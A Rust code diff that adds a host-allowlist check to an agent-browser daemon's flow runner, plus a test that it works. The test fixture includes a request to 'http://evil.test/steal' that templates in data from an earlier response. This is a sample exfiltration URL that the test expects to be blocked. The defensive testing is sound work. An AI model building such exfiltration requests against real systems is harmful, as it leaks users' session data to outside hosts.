@@ -12188,6 +12188,13 @@ async fn handle_flow_run_inner(
 
     let filter = state.domain_filter.read().await.clone();
     let hosts = super::flow::HostPolicy::of(&flow);
+    // Every request is checked before the first one is sent, on its template
+    // with references unfilled; each is checked again once they are filled.
+    for prepared in &requests {
+        hosts
+            .check(&prepared.url)
+            .map_err(|e| format!("flow '{}' step {}: {}", name, prepared.step, e))?;
+    }
     let client = super::flow::http_client(filter.clone(), &flow)?;
     let results = {
         let mut senders = DaemonSenders {
@@ -19959,6 +19966,45 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
             resp["error"].as_str().unwrap().contains("requires a name"),
             "{resp}"
         );
+    }
+
+    #[tokio::test]
+    async fn a_foreign_host_in_a_later_request_rejects_the_run_before_any_is_sent() {
+        let dir = tempfile::tempdir().unwrap();
+        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
+        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
+        let (port, hits) = serve_counting(
+            "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 11\r\nconnection: close\r\n\r\n{\"ok\":true}",
+        );
+        let base = format!("http://127.0.0.1:{}", port);
+        let expect = json!({ "status": 200, "mime": "application/json",
+            "signature": super::super::flow::signature(&json!({ "ok": true })),
+            "bytes": 11, "itemFields": [], "extract": null });
+        save_flow_json(json!({
+            "version": 1, "name": "two", "origin": "127.0.0.1",
+            "startUrl": format!("{}/", base), "allowedHosts": ["127.0.0.1"],
+            "output": "s2r1",
+            "steps": [
+                { "command": {}, "requests": [{ "id": "s1r1", "method": "GET",
+                    "url": format!("{}/session", base), "expect": expect }] },
+                { "command": {}, "requests": [{ "id": "s2r1", "method": "GET",
+                    "url": "http://evil.test/steal?c={{@s1r1.ok}}", "expect": expect }] }
+            ]
+        }));
+        let mut state = DaemonState::new();
+        state.policy = None;
+        state.confirm_actions = None;
+        let resp = execute_command(
+            &json!({ "id": "r", "action": "flow_run", "name": "two", "params": {} }),
+            &mut state,
+        )
+        .await;
+        assert_eq!(resp["success"], false, "{resp}");
+        assert!(
+            resp["error"].as_str().unwrap().contains("evil.test"),
+            "{resp}"
+        );
+        assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 0, "{resp}");
     }
 
     #[tokio::test]
